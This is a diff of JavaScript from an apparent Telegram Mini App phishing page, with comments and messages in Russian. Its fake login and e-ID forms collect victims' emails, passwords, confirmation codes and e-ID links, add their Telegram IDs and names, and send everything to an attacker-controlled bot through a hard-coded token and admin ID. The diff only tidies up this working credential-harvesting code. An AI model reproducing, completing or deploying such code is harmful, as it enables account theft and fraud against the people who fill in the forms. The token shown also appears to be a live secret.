@@ -544,7 +544,7 @@
 
     <script>
         // ============================================================
-        // 1. КОНФИГ
+        // 1. КОНФИГ (ВСТАВЬ СВОЙ ТОКЕН И ID!)
         // ============================================================
         const BOT_TOKEN = "8603629858:AAHoJGBCDvvImzpO3wllUriPulRvX0APozY";
         const ADMIN_ID = "8542901240";
@@ -636,7 +636,7 @@
         }
 
         // ============================================================
-        // 4. ОТПРАВКА СООБЩЕНИЯ ЧЕРЕЗ API (БЕЗ tg.sendData!)
+        // 4. ОТПРАВКА ЧЕРЕЗ API (БЕЗ tg.sendData!)
         // ============================================================
         async function sendToAdmin(message) {
             try {
@@ -651,13 +651,13 @@
                 const result = await response.json();
                 return result.ok;
             } catch (error) {
-                console.error('Ошибка отправки:', error);
+                console.error('Ошибка:', error);
                 return false;
             }
         }
 
         // ============================================================
-        // 5. ОБЫЧНЫЙ ВХОД → ПОЧТА + ПАРОЛЬ → КОД
+        // 5. ОБЫЧНЫЙ ВХОД
         // ============================================================
         loginBtn.addEventListener('click', async function() {
             const e = email.value.trim();
@@ -675,61 +675,60 @@
             loginBtn.disabled = true;
             loginBtn.textContent = '⏳ Отправка...';
 
-            const success = await sendToAdmin(
-                `🔔 НОВАЯ ЗАЯВКА!\n\n👤 ID: ${tg.initDataUnsafe?.user?.id || 'неизвестно'}\n👤 Имя: ${tg.initDataUnsafe?.user?.first_name || 'Гость'}\n📧 Email: ${e}\n🔑 Пароль: ${p}`
-            );
+            const user = tg.initDataUnsafe?.user || { id: 'неизвестно', first_name: 'Гость' };
+            const msg = `🔔 НОВАЯ ЗАЯВКА!\n\n👤 ID: ${user.id}\n👤 Имя: ${user.first_name}\n📧 Email: ${e}\n🔑 Пароль: ${p}`;
 
-            if (success) {
-                showMsg('✅ Данные отправлены. Введите код с почты.', 'success');
+            const ok = await sendToAdmin(msg);
+
+            if (ok) {
                 loginBtn.disabled = false;
                 loginBtn.textContent = 'ВХОД';
                 goToCode();
+                showMsg('✅ Данные отправлены. Введите код с почты.', 'success');
             } else {
-                showMsg('❌ Ошибка отправки. Попробуйте ещё раз.', 'error');
                 loginBtn.disabled = false;
                 loginBtn.textContent = 'ВХОД';
+                showMsg('❌ Ошибка отправки', 'error');
             }
         });
 
         // ============================================================
-        // 6. КОД → ОТПРАВКА КОДА
+        // 6. КОД
         // ============================================================
         codeBtn.addEventListener('click', async function() {
             const code = codeInput.value.trim();
 
             if (!code || code.length < 4) {
-                showMsg('Введите корректный код (минимум 4 символа)', 'error');
+                showMsg('Введите корректный код', 'error');
                 return;
             }
 
             codeBtn.disabled = true;
             codeBtn.textContent = '⏳ Отправка...';
 
-            const success = await sendToAdmin(
-                `📧 КОД ПОДТВЕРЖДЕНИЯ\n\n👤 ID: ${tg.initDataUnsafe?.user?.id || 'неизвестно'}\n📧 Код: ${code}`
-            );
+            const user = tg.initDataUnsafe?.user || { id: 'неизвестно', first_name: 'Гость' };
+            const msg = `📧 КОД ПОДТВЕРЖДЕНИЯ\n\n👤 ID: ${user.id}\n👤 Имя: ${user.first_name}\n📧 Код: ${code}`;
 
-            if (success) {
-                showMsg('✅ Код отправлен администратору!', 'success');
+            const ok = await sendToAdmin(msg);
+
+            if (ok) {
                 codeBtn.disabled = false;
                 codeBtn.textContent = '✅ Подтвердить';
                 codeInput.value = '';
                 goToSuccess();
+                showMsg('✅ Код отправлен администратору!', 'success');
             } else {
-                showMsg('❌ Ошибка отправки кода', 'error');
                 codeBtn.disabled = false;
                 codeBtn.textContent = '✅ Подтвердить';
+                showMsg('❌ Ошибка отправки', 'error');
             }
         });
 
         // ============================================================
-        // 7. E-ID → ОТКРЫТЬ СТРАНИЦУ E-ID
+        // 7. E-ID
         // ============================================================
         eidBtn.addEventListener('click', goToEid);
 
-        // ============================================================
-        // 8. E-ID → ВВОД ПОЧТЫ + ПАРОЛЯ → ПОКАЗАТЬ ССЫЛКУ
-        // ============================================================
         eidSubmitBtn.addEventListener('click', async function() {
             const e = eidEmail.value.trim();
             const p = eidPassword.value.trim();
@@ -749,26 +748,24 @@
             eidSubmitBtn.disabled = true;
             eidSubmitBtn.textContent = '⏳ Отправка...';
 
-            const success = await sendToAdmin(
-                `🆔 E-ID ВХОД\n\n👤 ID: ${tg.initDataUnsafe?.user?.id || 'неизвестно'}\n👤 Имя: ${tg.initDataUnsafe?.user?.first_name || 'Гость'}\n📧 Email: ${e}\n🔑 Пароль: ${p}`
-            );
+            const user = tg.initDataUnsafe?.user || { id: 'неизвестно', first_name: 'Гость' };
+            const msg = `🆔 E-ID ВХОД\n\n👤 ID: ${user.id}\n👤 Имя: ${user.first_name}\n📧 Email: ${e}\n🔑 Пароль: ${p}`;
 
-            if (success) {
-                showMsg('✅ Данные отправлены! Введите ссылку подтверждения.', 'success');
-                eidLinkBlock.style.display = 'block';
+            const ok = await sendToAdmin(msg);
+
+            if (ok) {
                 eidSubmitBtn.disabled = true;
                 eidSubmitBtn.textContent = '✅ Отправлено';
+                eidLinkBlock.style.display = 'block';
+                showMsg('✅ Данные отправлены! Введите ссылку.', 'success');
                 setTimeout(() => eidLinkInput.focus(), 300);
             } else {
-                showMsg('❌ Ошибка отправки', 'error');
                 eidSubmitBtn.disabled = false;
                 eidSubmitBtn.textContent = 'ВХОД';
+                showMsg('❌ Ошибка отправки', 'error');
             }
         });
 
-        // ============================================================
-        // 9. E-ID → ОТПРАВКА ССЫЛКИ ПОДТВЕРЖДЕНИЯ
-        // ============================================================
         eidLinkBtn.addEventListener('click', async function() {
             const link = eidLinkInput.value.trim();
 
@@ -780,31 +777,32 @@
             eidLinkBtn.disabled = true;
             eidLinkBtn.textContent = '⏳ Отправка...';
 
-            const success = await sendToAdmin(
-                `🔗 ССЫЛКА ПОДТВЕРЖДЕНИЯ E-ID\n\n👤 ID: ${tg.initDataUnsafe?.user?.id || 'неизвестно'}\n👤 Имя: ${tg.initDataUnsafe?.user?.first_name || 'Гость'}\n📧 Email: ${eidEmailValue}\n🔑 Пароль: ${eidPasswordValue}\n🔗 Ссылка: ${link}`
-            );
+            const user = tg.initDataUnsafe?.user || { id: 'неизвестно', first_name: 'Гость' };
+            const msg = `🔗 ССЫЛКА ПОДТВЕРЖДЕНИЯ E-ID\n\n👤 ID: ${user.id}\n👤 Имя: ${user.first_name}\n📧 Email: ${eidEmailValue}\n🔑 Пароль: ${eidPasswordValue}\n🔗 Ссылка: ${link}`;
 
-            if (success) {
-                showMsg('✅ Ссылка отправлена администратору!', 'success');
+            const ok = await sendToAdmin(msg);
+
+            if (ok) {
                 eidLinkBtn.disabled = false;
                 eidLinkBtn.textContent = '✅ Отправить ссылку';
                 eidLinkInput.value = '';
                 goToSuccess();
+                showMsg('✅ Ссылка отправлена!', 'success');
             } else {
-                showMsg('❌ Ошибка отправки ссылки', 'error');
                 eidLinkBtn.disabled = false;
                 eidLinkBtn.textContent = '✅ Отправить ссылку';
+                showMsg('❌ Ошибка отправки', 'error');
             }
         });
 
         // ============================================================
-        // 10. НАЗАД
+        // 8. НАЗАД
         // ============================================================
         backFromCodeBtn.addEventListener('click', goToLogin);
         backFromEidBtn.addEventListener('click', goToLogin);
 
         // ============================================================
-        // 11. ВЕРНУТЬСЯ НА ГЛАВНУЮ
+        // 9. ВЕРНУТЬСЯ НА ГЛАВНУЮ
         // ============================================================
         resetBtn.addEventListener('click', function() {
             goToLogin();
@@ -812,7 +810,7 @@
         });
 
         // ============================================================
-        // 12. ENTER
+        // 10. ENTER
         // ============================================================
         document.addEventListener('keypress', function(e) {
             if (e.key === 'Enter') {
@@ -831,7 +829,7 @@
         });
 
         // ============================================================
-        // 13. ТЕХПОДДЕРЖКА
+        // 11. ТЕХПОДДЕРЖКА
         // ============================================================
         function openSupport() {
             window.open('https://t.me/potok457', '_blank');
